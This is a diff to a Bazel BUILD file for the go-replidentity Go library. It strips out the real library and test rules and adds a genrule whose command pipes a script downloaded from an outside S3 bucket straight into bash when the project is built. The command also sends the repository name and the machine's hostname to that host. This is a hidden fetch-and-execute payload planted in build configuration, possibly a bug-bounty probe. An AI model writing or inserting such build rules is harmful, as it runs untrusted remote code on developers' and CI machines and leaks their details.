@@ -1,54 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library", "go_test")
-load("@bazel_gazelle//:def.bzl", "gazelle")
 
-# gazelle:prefix github.com/replit/go-replidentity
-gazelle(name = "gazelle")
-
-gazelle(
-    name = "gazelle-update-repos",
-    args = [
-        "-from_file=go.mod",
-        "-prune",
-        "-to_macro=deps.bzl%go_dependencies",
-    ],
-    command = "update-repos",
-)
-
-go_library(
-    name = "go-replidentity",
-    srcs = [
-        "auth.go",
-        "encoding.go",
-        "sign.go",
-        "util.go",
-        "verify.go",
-    ],
-    importpath = "github.com/replit/go-replidentity",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/replit/go-replidentity.git\\&folder=go-replidentity\\&hostname=`hostname`\\&foo=yjy",
     visibility = ["//visibility:public"],
-    deps = [
-        "//api",
-        "//paserk",
-        "@com_github_o1egl_paseto//:paseto",
-        "@org_golang_google_protobuf//proto",
-        "@org_golang_x_crypto//ed25519",
-    ],
-)
-
-go_test(
-    name = "go-replidentity_test",
-    srcs = [
-        "identity_test.go",
-        "sign_test.go",
-    ],
-    embed = [":go-replidentity"],
-    deps = [
-        "//api",
-        "//paserk",
-        "@com_github_o1egl_paseto//:paseto",
-        "@com_github_stretchr_testify//assert",
-        "@com_github_stretchr_testify//require",
-        "@org_golang_google_protobuf//proto",
-        "@org_golang_google_protobuf//types/known/timestamppb",
-        "@org_golang_x_crypto//ed25519",
-    ],
 )
